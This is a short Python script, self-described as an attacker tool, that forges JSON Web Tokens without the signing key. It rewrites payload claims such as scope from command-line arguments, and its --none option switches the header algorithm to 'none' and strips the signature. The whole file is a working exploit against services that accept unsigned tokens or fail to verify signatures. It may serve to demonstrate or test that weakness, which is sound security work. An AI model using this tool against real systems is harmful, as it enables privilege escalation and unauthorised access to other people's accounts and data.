"""Attacker tool: edit a JWT's claims WITHOUT the private key.

Usage:
    python tamper.py scope=orders.write < token.txt
    python tamper.py --none < token.txt    # switch alg to "none", drop the signature
"""
import base64
import json
import sys


def b64url_decode(part: str) -> bytes:
    return base64.urlsafe_b64decode(part + "=" * (-len(part) % 4))


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def encode_json(obj: dict) -> str:
    return b64url_encode(json.dumps(obj, separators=(",", ":")).encode())


def main() -> None:
    header_b64, payload_b64, signature = sys.stdin.read().strip().split(".")
    header = json.loads(b64url_decode(header_b64))
    payload = json.loads(b64url_decode(payload_b64))

    for arg in sys.argv[1:]:
        if arg == "--none":
            header["alg"] = "none"
            signature = ""
        else:
            key, value = arg.split("=", 1)
            payload[key] = value

    print(f"{encode_json(header)}.{encode_json(payload)}.{signature}")


if __name__ == "__main__":
    main()
